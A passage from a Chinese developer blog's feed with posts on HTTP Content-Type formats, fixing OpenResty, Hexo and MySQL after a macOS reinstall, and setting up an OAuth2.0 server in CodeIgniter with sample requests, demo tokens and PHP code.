+<h1 id="0x03-application-x-www-form-urlencoded"><a href="#0x03-application-x-www-form-urlencoded" class="headerlink" title="0x03.application/x-www-form-urlencoded"></a>0x03.application/x-www-form-urlencoded</h1><p><code>application/x-www-form-urlencoded</code>是常用的表单发包方式，普通的表单提交，或者js发包，默认都是通过这种方式，</p>
+<p>比如一个简单地表单：</p>
+<pre><code>&lt;form enctype=&quot;application/x-www-form-urlencoded&quot; action=&quot;http://homeway.me/post.php&quot; method=&quot;POST&quot;&gt;
+    &lt;input type=&quot;text&quot; name=&quot;name&quot; value=&quot;homeway&quot;&gt;
+    &lt;input type=&quot;text&quot; name=&quot;key&quot; value=&quot;nokey&quot;&gt;
+    &lt;input type=&quot;submit&quot; value=&quot;submit&quot;&gt;
+&lt;/form&gt;
+</code></pre><p>那么服务器收到的raw header会类似：</p>
+<pre><code>Accept:text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+Accept-Encoding:gzip, deflate
+Accept-Language:zh-CN,zh;q=0.8,en;q=0.6,zh-TW;q=0.4,gl;q=0.2,de;q=0.2
+Cache-Control:no-cache
+Connection:keep-alive
+Content-Length:17
+Content-Type:application/x-www-form-urlencoded
+</code></pre><p>那么服务器收到的raw body会是，<code>name=homeway&amp;key=nokey</code>，在php中，通过$_POST就可以获得数组形式的数据。</p>
+<p><br><hr></p>
+<h1 id="0x04-multipart-form-data"><a href="#0x04-multipart-form-data" class="headerlink" title="0x04.multipart/form-data"></a>0x04.multipart/form-data</h1><p><code>multipart/form-data</code>用在发送文件的POST包。</p>
+<p>这里假设我用python的request发送一个文件给服务器：</p>
+<pre><code>data = {
+    &quot;key1&quot;: &quot;123&quot;,
+    &quot;key2&quot;: &quot;456&quot;,
+}
+files = {&#39;file&#39;: open(&#39;index.py&#39;, &#39;rb&#39;)}
+res = requests.post(url=&quot;http://localhost/upload&quot;, method=&quot;POST&quot;, data=data, files=files)
+print res
+</code></pre><p>通过工具，可以看到我发送的数据内容如下：</p>
+<pre><code>POST http://www.homeway.me HTTP/1.1
+Content-Type:multipart/form-data; boundary=------WebKitFormBoundaryOGkWPJsSaJCPWjZP
+
+------WebKitFormBoundaryOGkWPJsSaJCPWjZP
+Content-Disposition: form-data; name=&quot;key2&quot;
+456
+------WebKitFormBoundaryOGkWPJsSaJCPWjZP
+Content-Disposition: form-data; name=&quot;key1&quot;
+123
+------WebKitFormBoundaryOGkWPJsSaJCPWjZP
+Content-Disposition: form-data; name=&quot;file&quot;; filename=&quot;index.py&quot;
+</code></pre><p>这里<code>Content-Type</code>告诉我们，发包是以<code>multipart/form-data</code>格式来传输，另外，还有<code>boundary</code>用于分割数据。</p>
+<p>当文件太长，HTTP无法在一个包之内发送完毕，就需要分割数据，分割成一个一个chunk发送给服务端，</p>
+<p>那么<code>--</code>用于区分数据快，而后面的数据<code>633e61ebf351484f9124d63ce76d8469</code>就是标示区分包作用。</p>
+<p><br><hr></p>
+<h1 id="0x05-text-xml"><a href="#0x05-text-xml" class="headerlink" title="0x05.text/xml"></a>0x05.text/xml</h1><p>微信用的是这种数据格式发送请求的。</p>
+<pre><code>POST http://www.homeway.me HTTP/1.1 
+Content-Type: text/xml
+
+&lt;?xml version=&quot;1.0&quot;?&gt;
+&lt;resource&gt;
+    &lt;id&gt;123&lt;/id&gt;
+    &lt;params&gt;
+        &lt;name&gt;
+            &lt;value&gt;homeway&lt;/value&gt;
+        &lt;/name&gt;
+        &lt;age&gt;
+            &lt;value&gt;22&lt;/value&gt;
+        &lt;/age&gt;
+    &lt;/params&gt;
+&lt;/resource&gt;
+</code></pre><p>php中<code>$_POST</code>只能读取<code>application/x-www-form-urlencoded</code>数据，<code>$_FILES</code>只能读取<code>multipart/form-data</code>类型数据，</p>
+<p>那么，要读取<code>text/xml</code>格式的数据，可以用：</p>
+<blockquote>
+<p>$file = fopen(‘php://input’, ‘rb’);<br>$data = fread($file, length);<br>fclose($file);</p>
+</blockquote>
+<p>或者</p>
+<blockquote>
+<p>$data = file_get_contents(‘php://input’);</p>
+</blockquote>
+<p><br><hr></p>
+<h1 id="0x06-application-json"><a href="#0x06-application-json" class="headerlink" title="0x06.application/json"></a>0x06.application/json</h1><p>通过json形式将数据发送给服务器，一开始，我尝试通过curl，给服务器发送<code>application/json</code>格式包，</p>
+<p>然而我收到的数据如下：</p>
+<blockquote>
+<p>————————–e1e1406176ee348a Content-Disposition: form-data; name=”nid” 2 ————————–e1e1406176ee348a Content-Disposition: form-data; name=”uuid” cf9dc994-a4e7-3ad6-bc54-41965b2a0dd7 ————————–e1e1406176ee348a Content-Disposition: form-data; name=”access_token” 956731586df41229dbfec08dd5d54eedb98d73d2 ————————–e1e1406176ee348a–</p>
+</blockquote>
+<p>后来想想明白了，HTTP通信中并不存在所谓的json，而是将string转成json罢了，也就是，<code>application/json</code>可以将它理解为<code>text/plain</code>，普通字符串。</p>
+<p>之所以出现那么多乱七八糟的<code>-------</code>应该是php数组传输进去，存在的转换问题吧（我目前能想到的原因）。</p>
+<p><br></p>
+<h4 id="本文出自-夏日小草-转载请注明出处-http-homeway-me-2015-07-19-understand-http-about-content-type"><a href="#本文出自-夏日小草-转载请注明出处-http-homeway-me-2015-07-19-understand-http-about-content-type" class="headerlink" title="本文出自 夏日小草,转载请注明出处:http://homeway.me/2015/07/19/understand-http-about-content-type/"></a>本文出自 <a href="http://homeway.me">夏日小草</a>,转载请注明出处:<a href="http://homeway.me/2015/07/19/understand-http-about-content-type/">http://homeway.me/2015/07/19/understand-http-about-content-type/</a></h4><p>-by小草</p>
+<p>2015-07-19 01:35:10</p>
+]]></content>
+    
+    <summary type="html">
+    
+      &lt;p&gt;&lt;br&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;http://77l5jp.com1.z0.glb.clouddn.com/blog/logo-http.png&quot; alt=&quot;http&quot;&gt;&lt;/p&gt;
+    
+    </summary>
+    
+      <category term="Tech" scheme="https://homeway.me/categories/Tech/"/>
+    
+    
+      <category term="HTTP" scheme="https://homeway.me/tags/HTTP/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>MAC重装各种的痛点</title>
+    <link href="https://homeway.me/2015/07/10/rebuild-osx-environment/"/>
+    <id>https://homeway.me/2015/07/10/rebuild-osx-environment/</id>
+    <published>2015-07-09T16:56:01.000Z</published>
+    <updated>2015-08-05T05:43:15.000Z</updated>
+    
+    <content type="html"><![CDATA[<p><br></p>
+<p><img src="http://77l5jp.com1.z0.glb.clouddn.com/blog/logo-osx.png" alt="OSX"></p>
+<a id="more"></a>
+<p><br></p>
+<h1 id="0x01-About"><a href="#0x01-About" class="headerlink" title="0x01.About"></a>0x01.About</h1><p>最近不小心做死，删了很多安装包，最后只能重装了MAC，用了3天多修复开发环境。</p>
+<p>想想时候该入Docker了，每次这么搞要玩命了。</p>
+<p><br><hr></p>
+<h1 id="0x02-Openresty"><a href="#0x02-Openresty" class="headerlink" title="0x02.Openresty"></a>0x02.Openresty</h1><p>第一次装openresty没有事情的，然而重装MAC后，再装openresty出现了问题。安装openresty可以直接</p>
+<blockquote>
+<p>git clone <a href="https://github.com/openresty" target="_blank" rel="external">https://github.com/openresty</a></p>
+</blockquote>
+<p>下来，运行make，自动下载依赖包，也可以直接到 <a href="http://openresty.org/" target="_blank" rel="external">http://openresty.org/</a> 下载打包好的。</p>
+<h2 id="1-openssl缺少错误如下"><a href="#1-openssl缺少错误如下" class="headerlink" title="1.openssl缺少错误如下"></a>1.openssl缺少错误如下</h2><pre><code>./configure: error: SSL modules require the OpenSSL library.
+You can either do not enable the modules, or install the OpenSSL library
+into the system, or build the OpenSSL library statically from the source
+with nginx by using --with-openssl=&lt;path&gt; option.
+
+ERROR: failed to run command: sh ./configure --prefix=/usr/local/openresty/nginx \…
+</code></pre><p>缺少openssl库，那就把本机安装路径告诉它吧:</p>
+<blockquote>
+<p>./configure –with-openssl=/usr/local/Cellar/openssl/1.0.2c</p>
+</blockquote>
+<h2 id="2-openssl源码安装错误"><a href="#2-openssl源码安装错误" class="headerlink" title="2.openssl源码安装错误"></a>2.openssl源码安装错误</h2><pre><code>/Applications/Xcode.app/Contents/Developer/usr/bin/make -f objs/Makefile
+cd /usr/local/Cellar/openssl/1.0.2c \
+    &amp;&amp; if [ -f Makefile ]; then /Applications/Xcode.app/Contents/Developer/usr/bin/make clean; fi \
+    &amp;&amp; ./config --prefix=/usr/local/Cellar/openssl/1.0.2c/.openssl no-shared  no-threads \
+    &amp;&amp; /Applications/Xcode.app/Contents/Developer/usr/bin/make \
+    &amp;&amp; /Applications/Xcode.app/Contents/Developer/usr/bin/make install LIBDIR=lib
+/bin/sh: ./config: No such file or directory
+make[2]: *** [/usr/local/Cellar/openssl/1.0.2c/.openssl/include/openssl/ssl.h] Error 127
+make[1]: *** [build] Error 2
+make: *** [all] Error 2
+</code></pre><p>上了github，<a href="https://github.com/torch/image/issues/16" target="_blank" rel="external">https://github.com/torch/image/issues/16</a>，查查，明白了，这里要的是source code，不是安装路径，够坑的了吧。</p>
+<p>那么好了，到<a href="https://www.openssl.org/" target="_blank" rel="external">https://www.openssl.org/</a>下载了最新的，openssl.1.0.2c版本，到bundle目录里：</p>
+<blockquote>
+<p>./configure –with-openssl=bundle/openssl.1.0.2c</p>
+</blockquote>
+<p>报了个warning：</p>
+<pre><code>WARNING! If you wish to build 64-bit library, then you have to
+         invoke &#39;./Configure darwin64-x86_64-cc&#39; *manually*.
+         You have about 5 seconds to press Ctrl-C to abort.
+</code></pre><p>看着是openssl与darwin的版本不兼容问题，后来发现是新版的openssl与nginx兼容问题。</p>
+<h2 id="3-pcre依赖报错"><a href="#3-pcre依赖报错" class="headerlink" title="3.pcre依赖报错"></a>3.pcre依赖报错</h2><pre><code>ld: symbol(s) not found for architecture x86_64 collect2: ld 
+returned 1 exit status make[2]: *** [objs/nginx] 
+Error 1 make[1]: *** [build] 
+Error 2 make: *** 
+[all] Error 2
+</code></pre><p>找一找，发现了问题解决方案，是pcre依赖包没带上，也就是正则匹配依赖包的问题了：</p>
+<p>在github上找到了issuse相关信息： <a href="https://github.com/openresty/ngx_openresty/issues/3#issuecomment-120227290" target="_blank" rel="external">https://github.com/openresty/ngx_openresty/issues/3#issuecomment-120227290</a></p>
+<p>最后在issuse上问道了agentzh的解决方案，agentzh的makefile里在处理新版nginx与openssl依赖上的一点问题，后来他更新了github仓库：</p>
+<pre><code>export KERNEL_BITS=64
+./configure --with-cc-opt=&#39;-I/usr/local/Cellar/pcre/8.37/include/&#39; \
+       --with-ld-opt=&#39;-L/usr/local/Cellar/pcre/8.37/lib&#39; \
+       --with-openssl=$HOME/work/openssl-1.0.2d -j9
+make -j9
+sudo make install
+</code></pre><p>在我这里(MAC OSX 10.10.4)运行起来是没问题的。</p>
+<p>两个问题：</p>
+<p>1.openssl依赖，要用源码，要export告诉系统环境变量 </p>
+<p>2.pcre包要手动加上去。</p>
+<p><br><hr></p>
+<h1 id="0x03-Hexo"><a href="#0x03-Hexo" class="headerlink" title="0x03.Hexo"></a>0x03.Hexo</h1><p>安装hexo 3.0各种骂声，都是从2.8升上去的人喊的不兼容问题。</p>
+<p>嗯…照着官网的打吧，一步一步走下来吧：</p>
+<blockquote>
+<p>npm install hexo-cli -g</p>
+<p>hexo init</p>
+<p>npm install </p>
+<p>hexo server</p>
+</blockquote>
+<p>报错了：</p>
+<pre><code>$ hexo s
+{ [Error: Cannot find module &#39;./build/Release/DTraceProviderBindings&#39;] code: &#39;MODULE_NOT_FOUND&#39; }
+{ [Error: Cannot find module &#39;./build/default/DTraceProviderBindings&#39;] code: &#39;MODULE_NOT_FOUND&#39; }
+{ [Error: Cannot find module &#39;./build/Debug/DTraceProviderBindings&#39;] code: &#39;MODULE_NOT_FOUND&#39; }
+ERROR Plugin load failed: hexo-server
+</code></pre><p>后来看了下，问题很简单，少了几个库没装上，估计是天朝对外网络问题，没下载全就直接停掉了。</p>
+<p>方案一：</p>
+<p>换个国内npm源，然后：</p>
+<blockquote>
+<p>npm install hexo –no-optional</p>
+</blockquote>
+<p>方案二：</p>
+<p>把之前的<code>node_modules</code>，放到新的目录下，大约50MB。</p>
+<p>需要的可以mail我，base64 地址如下mailto: eGlhb2Nhby5ncmFzc2VzQGdtYWlsLmNvbQ==</p>
+<p><br><hr></p>
+<h1 id="0x04-Mysql"><a href="#0x04-Mysql" class="headerlink" title="0x04.Mysql"></a>0x04.Mysql</h1><blockquote>
+<p>ERROR 2002 (HY000): Can’t connect to local MySQL server through socket ‘/tmp/mysql.sock’</p>
+</blockquote>
+<p>mysql的2002报错估计很多人都碰到过了，也就是，<code>/tmp/mysql.sock</code> 文件不存在的问题，没有<code>/tmp/mysql.sock</code>的话，就不能phpmyadmin等客户端进行连接了。</p>
+<p>很多地方解决方法无非就是添加个link，把<code>/usr/var/mysql/mysqld.sock</code> 和 <code>/tmp/mysql.sock</code>关联起来吧，最后都不行。</p>
+<p>mysql的默认配置文件为my.cnf，mysql默认回去这几个位置找这个文件，<br><code>/etc/my.cnf</code>,<br><code>/etc/mysql/my.cnf</code>,<br><code>/home/username/my.cnf</code>,<br><code>/home/username/.mysql/my.cnf</code>，</p>
+<p>然而在MAC中，默认是没有配置文件的，那么你要自己去新建。</p>
+<h2 id="下面是完整的解决方案："><a href="#下面是完整的解决方案：" class="headerlink" title="下面是完整的解决方案："></a>下面是完整的解决方案：</h2><ol>
+<li>执行安装：</li>
+</ol>
+<blockquote>
+<p>$ brew install mysql</p>
+</blockquote>
+<ol>
+<li>在 /usr/local/etc/ 下创建或修改 my.cnf，示例：<br>```<br>[client]<br>port = 3306<br>socket = /tmp/mysql.sock<br>default-character-set = utf8</li>
+</ol>
+<p>[mysqld]<br>collation-server = utf8_unicode_ci<br>character-set-server = utf8<br>init-connect =’SET NAMES utf8’<br>max_allowed_packet = 64M<br>bind-address = 127.0.0.1<br>port = 3306<br>socket = /tmp/mysql.sock<br>innodb_file_per_table=1</p>
+<p>[mysqld_safe]<br>timezone = ‘+0:00’</p>
+<p>```</p>
+<ol>
+<li>赞安装完 mysql 后，他会提示你 init database，并提供下面这两句让你执行，很可能你没执行这两句</li>
+</ol>
+<blockquote>
+<p>$ unset TMPDIR<br>$ mysql_install_db –verbose –user=<code>whoami</code> –basedir=”$(brew –prefix mysql)” –datadir=/usr/local/var/mysql –tmpdir=/tmp</p>
+</blockquote>
+<ol>
+<li>然后就可以指向 mysql.server start 来启动了，为了安全，你还可以执行安全设置向导，根据提示一步一步配置</li>
+</ol>
+<blockquote>
+<p>$ mysql_secure_installation</p>
+</blockquote>
+<p><br><hr></p>
+<p>这里只记下几个重装的痛点，各种蛋疼，于是爽爽地入docker了，期待docker能有新发现。</p>
+<p>将来，待续…</p>
+<p><br></p>
+<h4 id="本文出自-夏日小草-转载请注明出处-http-homeway-me-2015-07-10-rebuild-osx-environment"><a href="#本文出自-夏日小草-转载请注明出处-http-homeway-me-2015-07-10-rebuild-osx-environment" class="headerlink" title="本文出自 夏日小草,转载请注明出处:http://homeway.me/2015/07/10/rebuild-osx-environment/"></a>本文出自 <a href="http://homeway.me">夏日小草</a>,转载请注明出处:<a href="http://homeway.me/2015/07/10/rebuild-osx-environment/">http://homeway.me/2015/07/10/rebuild-osx-environment/</a></h4><p><br><br>-by小草</p>
+<p>2015-07-10 21:35:10</p>
+]]></content>
+    
+    <summary type="html">
+    
+      &lt;p&gt;&lt;br&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;http://77l5jp.com1.z0.glb.clouddn.com/blog/logo-osx.png&quot; alt=&quot;OSX&quot;&gt;&lt;/p&gt;
+    
+    </summary>
+    
+      <category term="Tech" scheme="https://homeway.me/categories/Tech/"/>
+    
+    
+      <category term="MAC" scheme="https://homeway.me/tags/MAC/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>CI环境下开发Oauth2.0开放平台</title>
+    <link href="https://homeway.me/2015/06/29/build-oauth2-under-codeigniter/"/>
+    <id>https://homeway.me/2015/06/29/build-oauth2-under-codeigniter/</id>
+    <published>2015-06-28T16:04:10.000Z</published>
+    <updated>2017-01-13T12:56:55.000Z</updated>
+    
+    <content type="html"><![CDATA[<p><br></p>
+<p><img src="http://77l5jp.com1.z0.glb.clouddn.com/blog/logo-oauth2.png" alt="Oauth2.0"></p>
+<a id="more"></a>
+<p><br></p>
+<h1 id="0x01-About"><a href="#0x01-About" class="headerlink" title="0x01.About"></a>0x01.About</h1><p>最近在搭建Oauth2.0第三方接入开放平台，主要是使用Github开源项目服务模块<a href="https://github.com/bshaffer/oauth2-server-php" target="_blank" rel="external">https://github.com/bshaffer/oauth2-server-php</a>和CodeIgniter结合。</p>
+<p>一般来说做开放平台主要包括：Oauth2.0认证平台、Resource资源API平台、Open开发者注册平台，以及API说明等。</p>
+<p>Oauth2.0测试平台已经搭建好，请访问 <a href="http://oauth2.homeway.me/oauth/test/" target="_blank" rel="external">http://oauth2.homeway.me/oauth/test/</a></p>
+<p><hr><br></p>
+<h1 id="0x02-About-Oauth2-0"><a href="#0x02-About-Oauth2-0" class="headerlink" title="0x02.About Oauth2.0"></a>0x02.About Oauth2.0</h1><p>OAuth 2.0授权前，第三方应用必须到平台上进行注册，注册过程中可能需要填写的内容有：应用类型，授权成功回调地址，以及其他平台需要的资料（应用名称、网址、介绍、LOGO图片等）。</p>
+<p>OAuth 2.0标准主要围绕三类应用：Web应用、基于客户端的应用、原生应用。</p>
+<p>应用在Open开发者平台注册完成会得到一个应用client_id和一个client_secret，一般叫<code>App Key</code>，密钥叫<code>App Secret</code>，这两样东西作用跟用户名密码是一样的。</p>
+<p><a href="http://tools.ietf.org/html/rfc6749" target="_blank" rel="external">OAuth 2.0 RFC</a> 中提到的授权方式有四种：授权码（Authorization Code）、隐式授权（Implicit Grant）、用户口令（Resource Owner Password Credentials）、应用口令（Client Credentials）。</p>
+<p>这四种方式最终的目的都是要获得Access Token，然后通过请求Resource服务器获取资源。</p>
+<p><hr><br></p>
+<h1 id="0x03-Grant-type"><a href="#0x03-Grant-type" class="headerlink" title="0x03.Grant_type"></a>0x03.Grant_type</h1><p>说说每种授权方式使用到的地方，或授权的方式。</p>
+<h2 id="Authorization-Code"><a href="#Authorization-Code" class="headerlink" title="Authorization Code"></a>Authorization Code</h2><p><img src="http://77l5jp.com1.z0.glb.clouddn.com/blog/2015-06-28-build-oauth2-under-codeigniter-authorization_1.jpg" alt="Authorization Code"></p>
+<p>授权码方式在很多地方都有用到，微博登陆，微信登陆等都是。</p>
+<p>认证过程主要是跳转到Oauth2.0平台，认证后跳转回第三方应用平台，并通过callback的url中携带code、state、token_type等信息，然后第三方平台通过code获取到access_token，进而调用开放API获取到资源。</p>
+<p>第三方请求过程必须附带，<code>response_type</code>（回调类型：code，token）,<code>client_id</code>（开发者app key）,<code>redirect_uri</code>（回调链接），<code>state</code>（防止csrf，authorization认证跳转后原样返回）。</p>
+<p>例如：<a href="http://localhost:8085/oauth2/authorize/index?redirect_uri=http://homeway.me&amp;response_type=code&amp;client_id=testclient&amp;state=ae5f8c93dc51d856d6536aec528c31c6f6450458" target="_blank" rel="external">http://localhost:8085/oauth2/authorize/index?redirect_uri=http://homeway.me&amp;response_type=code&amp;client_id=testclient&amp;state=ae5f8c93dc51d856d6536aec528c31c6f6450458</a></p>
+<p>测试例子：<a href="http://brentertainment.com/oauth2/" target="_blank" rel="external">http://brentertainment.com/oauth2/</a></p>
+<p>第一步：跳转到Oauth2.0服务器：</p>
+<p>认证过程中会请求<code>scope</code>权限表，用户可以拒绝相应权限。</p>
+<p><img src="http://77l5jp.com1.z0.glb.clouddn.com/blog/2015-06-28-build-oauth2-under-codeigniter-authorization_2.jpg" alt="跳转到Oauth2.0服务器"></p>
+<p>第二步：用户确认请求的权限，回调得到code：</p>
+<p><img src="http://77l5jp.com1.z0.glb.clouddn.com/blog/2015-06-28-build-oauth2-under-codeigniter-authorization_3.jpg" alt="用户确认请求的权限"></p>
+<p>第三步：第三方平台通过code得到access_token，然后通过API调用Resource服务器资源。</p>
+<p>这个过程需要发送<code>client_id</code>，<code>client_secret</code>（App Secret），<code>grant_type</code>（’authorization_code’），<code>code</code>，<code>redirect_uri</code>给oauth2服务器获取<code>access_token</code>。</p>
+<p>例如：<a href="http://brentertainment.com/oauth2/client/request_token/authorization_code?code=bab6b7dee32f629397acbb16a4d8e50c6c3d424d" target="_blank" rel="external">http://brentertainment.com/oauth2/client/request_token/authorization_code?code=bab6b7dee32f629397acbb16a4d8e50c6c3d424d</a></p>
+<p><br></p>
+<h2 id="Implicit-Grant"><a href="#Implicit-Grant" class="headerlink" title="Implicit Grant"></a>Implicit Grant</h2><p>隐式授权流程（Implicit Grant）其实就是Authorization Code的一个简化版本，不是回调code，而是直接回调access_token给第三方开发者，<code>response_type</code>变为token，其他和Authorization Code一样。</p>
+<p>例如：<a href="http://brentertainment.com/oauth2/lockdin/authorize?response_type=token&amp;client_id=demoapp&amp;redirect_uri=http%3A%2F%2Fbrentertainment.com%2Foauth2%2Fclient%2Freceive_implicit_token&amp;state=377edd18bd3070e4317889b0b3371c16" target="_blank" rel="external">http://brentertainment.com/oauth2/lockdin/authorize?response_type=token&amp;client_id=demoapp&amp;redirect_uri=http%3A%2F%2Fbrentertainment.com%2Foauth2%2Fclient%2Freceive_implicit_token&amp;state=377edd18bd3070e4317889b0b3371c16</a></p>
+<p>跳转后就得到了，如下链接：<a href="http://brentertainment.com/oauth2/client/receive_implicit_token#access_token=a845c2c81bc57613bbc5dee1fec173a3fbd0f474&amp;expires_in=3600&amp;token_type=Bearer&amp;state=377edd18bd3070e4317889b0b3371c16" target="_blank" rel="external">http://brentertainment.com/oauth2/client/receive_implicit_token#access_token=a845c2c81bc57613bbc5dee1fec173a3fbd0f474&amp;expires_in=3600&amp;token_type=Bearer&amp;state=377edd18bd3070e4317889b0b3371c16</a></p>
+<p><br></p>
+<h2 id="Client-Credentials"><a href="#Client-Credentials" class="headerlink" title="Client Credentials"></a>Client Credentials</h2><p>应用授权（Client Credentials）主要用于第三方应用直接获取一些公开的数据，不需要用户跳转认证，也不需要获取用户的openid，因为都是一些公共的资源。</p>
+<p><img src="http://77l5jp.com1.z0.glb.clouddn.com/blog/2015-06-28-build-oauth2-under-codeigniter-client-credentials_2.jpg" alt="Client Credentials"></p>
+<p>我的请求数据为：<code>{client_id: &quot;testclient&quot;, client_secret: &quot;testpass&quot;, grant_type: &quot;client_credentials&quot;, scope: &quot;userinfo cloud file node&quot;}</code></p>
+<p>Oauth2给我的回调数据：<code>{&quot;access_token&quot;:&quot;417206d0e162d743338c04da9f8eb72f99daff6b&quot;,&quot;expires_in&quot;:3600,&quot;token_type&quot;:&quot;Bearer&quot;,&quot;scope&quot;:&quot;userinfo cloud file node&quot;}</code></p>
+<p>可以看到有了access_token，然后我就可以用access_token去找Resource服务器要资源了，这里限定了<code>scope</code>权限表，表的权限在open平台注册的时候就确定下来了。</p>
+<p><br></p>
+<h2 id="Resource-Owner-Password-Credentials"><a href="#Resource-Owner-Password-Credentials" class="headerlink" title="Resource Owner Password Credentials"></a>Resource Owner Password Credentials</h2><p>用户口令（Resource Owner Password Credentials）适合内部应用调用使用，比如公司有两个平台，A和B，那么我就可以在Oauth2下通过<code>Password Credentials</code>模式实现A应用与B应用之间通信，还可以开放内部接口。</p>
+<p><img src="http://77l5jp.com1.z0.glb.clouddn.com/blog/2015-06-28-build-oauth2-under-codeigniter-client-credentials_1.jpg" alt="Client Credentials"></p>
+<p>请求的数据格式是：<br><code>{grant_type: &quot;password
+username:&quot;user&quot;, password: &quot;pass&quot;,client_id: &quot;&quot;testclient&quot;, client_secret: &quot;testpass&quot;, scope: &quot;userinfo cloud file node}</code></p>
+<p>回调数据比Client Credentials多了一个<code>refresh_token</code>:</p>
+<p><code>{&quot;access_token&quot;:&quot;8a478275f8d2d5ac767f94ef0684a1fc2883eb24&quot;,
+&quot;expires_in&quot;:3600,
+&quot;token_type&quot;:&quot;Bearer&quot;,
+&quot;scope&quot;:&quot;userinfo cloud file node&quot;,
+&quot;refresh_token&quot;:&quot;69a5e7b995ed4376bd6dd58380bfe09b51137dcb&quot;}</code></p>
+<p>那么当<code>access_token</code>过期后，就可以通过<code>refresh_token</code>再次激活一个新的<code>access_token</code>，黑魔法，自己给自己开后门。</p>
+<p>激活请求发送的数据为：<br><code>{grant_type: &quot;refresh_token&quot;,
+username:&quot;user&quot;, password: &quot;pass&quot;, client_id: &quot;&quot;testclient&quot;, client_secret: &quot;testpass&quot;, scope: &quot;userinfo cloud file node}</code></p>
+<p>返回还是一个新的access_token数据。</p>
+<p><hr><br></p>
+<h1 id="0x04-CodeIgniter与Oauth2-0"><a href="#0x04-CodeIgniter与Oauth2-0" class="headerlink" title="0x04.CodeIgniter与Oauth2.0"></a>0x04.CodeIgniter与Oauth2.0</h1><p>四种授权方式都说过了，那么就开始搭建基于CodeIgniter的Oauth2.0平台了。</p>
+<h2 id="基础环境搭建"><a href="#基础环境搭建" class="headerlink" title="基础环境搭建"></a>基础环境搭建</h2><p>1.下载CI框架：<code>$wget https://codeload.github.com/bcit-ci/CodeIgniter/zip/3.0.0</code></p>
+<p>2.解压 <code>$unzip CodeIgniter-3.0.0.zip</code></p>
+<p>3.进入library目录 <code>$cd CodeIgniter-3.0.0/application/libraries</code> </p>
+<p>4.获取oauth2-php-server: <code>git clone https://github.com/bshaffer/oauth2-server-php &amp;&amp; mv -f oauth2-server-php oauth2</code></p>
+<p>5.通过composer安装 oauth2-server-php ：<code>cd oauth2 &amp;&amp; composer install</code></p>
+<p>如果国内composer安装慢的话，我打了一个包，可以再这里下载到：<a href="http://785igi.com1.z0.glb.clouddn.com/share/oauth2-server-php.zip" target="_blank" rel="external">oauth2-server-php.zip</a></p>
+<h2 id="Oauth2-0数据库"><a href="#Oauth2-0数据库" class="headerlink" title="Oauth2.0数据库"></a>Oauth2.0数据库</h2><p>好了，ci和oauth2都处理好了，接下来导入下数据库的sql文件。</p>
+<p>oauth2.0平台支持多种数据库，可以在<code>oauth2/src/Oauth2/Storage/</code>里面看到，有mongodb、mysql、redis等。</p>
+<p>这里就选简单的mysql吧，数据库主要包含oauth_access_tokens、oauth_authorization_codes、oauth_clients、oauth_jwt、oauth_refresh_tokens、oauth_scopes、oauth_users几个表。</p>
+<p><code>oauth_users</code>是Password Credentials认证的时候用的表，<code>oauth_scopes</code>存放权限表，<code>oauth_refresh_tokens</code>是Password Credentials认证的时候的refresh_token表，<code>oauth_clients</code>存放开发者注册的信息表。</p>
+<p>sql文件可以在这里下载：<a href="http://homeway.me/code/oauth2.sql">http://homeway.me/code/oauth2.sql</a></p>
+<h2 id="Server服务"><a href="#Server服务" class="headerlink" title="Server服务"></a>Server服务</h2><p>接下来在<code>CodeIgniter-3.0.0/application/libraries/oauth2</code>里面新建一个<code>server.php</code>，<br>用于对oauth2内调用与对外ci服务的接口。</p>
+<p>###创建一个Authorization Code服务</p>
+<pre><code>class Server{
+  function __construct(){
+    OAuth2\Autoloader::register();
+    $this-&gt;storage = new OAuth2\Storage\Pdo(array(&#39;dsn&#39; =&gt; &#39;mysql:dbname=oauth;host=localhost&#39;, &#39;username&#39; =&gt; &#39;&#39;, &#39;password&#39; =&gt; &#39;&#39;));
+    $this-&gt;server = new OAuth2\Server($this-&gt;storage, array(&#39;allow_implicit&#39; =&gt; true));
+    $this-&gt;request = OAuth2\Request::createFromGlobals();
+    $this-&gt;response = new OAuth2\Response();
+  }
+  public function authorize($is_authorized){
+    $this-&gt;server-&gt;addGrantType(new OAuth2\GrantType\AuthorizationCode($this-&gt;storage));
+    $this-&gt;server-&gt;handleAuthorizeRequest($this-&gt;request, $this-&gt;response, $is_authorized);
+    if ($is_authorized) {
+      $code = substr($response-&gt;getHttpHeader(&#39;Location&#39;), strpos($response-&gt;getHttpHeader(&#39;Location&#39;), &#39;code=&#39;)+5, 40);
+      header(&quot;Location: &quot;.$response-&gt;getHttpHeader(&#39;Location&#39;));
+    }
+    $response-&gt;send();
+  }
+}
+</code></pre><p>###创建一个Password Credentials服务</p>
+<pre><code>class Server{
+  function __construct(){
+    OAuth2\Autoloader::register();
+    $this-&gt;storage = new OAuth2\Storage\Pdo(array(&#39;dsn&#39; =&gt; &#39;mysql:dbname=oauth;host=localhost&#39;, &#39;username&#39; =&gt; &#39;&#39;, &#39;password&#39; =&gt; &#39;&#39;));
+    $this-&gt;server = new OAuth2\Server($this-&gt;storage, array(&#39;allow_implicit&#39; =&gt; true));
+    $this-&gt;request = OAuth2\Request::createFromGlobals();
+    $this-&gt;response = new OAuth2\Response();
+  }
+  public function password_credentials(){
+    $users = array(&quot;user&quot; =&gt; array(&quot;password&quot; =&gt; &#39;pass&#39;, &#39;first_name&#39; =&gt; &#39;homeway&#39;, &#39;last_name&#39; =&gt; &#39;yao&#39;));
+    $storage = new OAuth2\Storage\Memory(array(&#39;user_credentials&#39; =&gt; $users));//user是认证的账户，在表oauth_users中
+    $this-&gt;server-&gt;addGrantType(new OAuth2\GrantType\UserCredentials($storage));
+    $this-&gt;server-&gt;handleTokenRequest($this-&gt;request)-&gt;send();
+  }
+}
+</code></pre><p>###创建一个Client Credentials服务</p>
+<pre><code>class Server{
+  function __construct(){
+    OAuth2\Autoloader::register();
+    $this-&gt;storage = new OAuth2\Storage\Pdo(array(&#39;dsn&#39; =&gt; &#39;mysql:dbname=oauth;host=localhost&#39;, &#39;username&#39; =&gt; &#39;&#39;, &#39;password&#39; =&gt; &#39;&#39;));
+    $this-&gt;server = new OAuth2\Server($this-&gt;storage, array(&#39;allow_implicit&#39; =&gt; true));
+    $this-&gt;request = OAuth2\Request::createFromGlobals();
+    $this-&gt;response = new OAuth2\Response();
+  }
+  public function client_credentials(){
